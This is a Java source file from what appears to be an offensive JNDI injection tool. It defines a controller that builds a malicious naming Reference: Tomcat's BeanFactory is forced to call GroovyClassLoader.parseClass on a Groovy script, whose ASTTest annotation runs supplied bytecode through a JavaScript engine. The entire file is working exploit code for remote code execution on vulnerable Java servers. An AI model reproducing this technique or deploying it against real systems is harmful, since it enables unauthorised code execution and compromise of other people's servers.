package com.h2tg.ysogate.controller.bypass;

import com.h2tg.ysogate.annotation.JNDIController;
import com.h2tg.ysogate.annotation.JNDIMapping;
import com.h2tg.ysogate.controller.BasicController;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;
import java.util.Base64;

import static com.h2tg.ysogate.bullet.defineClass.JsConverter.all;

@JNDIController
@JNDIMapping("/GroovyClassLoader")
public class GroovyClassLoaderController extends BasicController
{
    @Override
    public Object process(Object obj)
    {
        byte[] byteCode = (byte[]) obj;
        System.out.println("[Reference] Factory: BeanFactory + GroovyClassLoader");

        String code = all(Base64.getEncoder().encodeToString(byteCode));

        String script = "@groovy.transform.ASTTest(value={\n" +
                "    assert Class.forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"" + code + "\")\n" +
                "})\n" +
                "class Person {\n" +
                "}";

        ResourceRef ref = new ResourceRef("groovy.lang.GroovyClassLoader", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "x=parseClass"));
        ref.add(new StringRefAddr("x", script));
        return ref;
    }
}
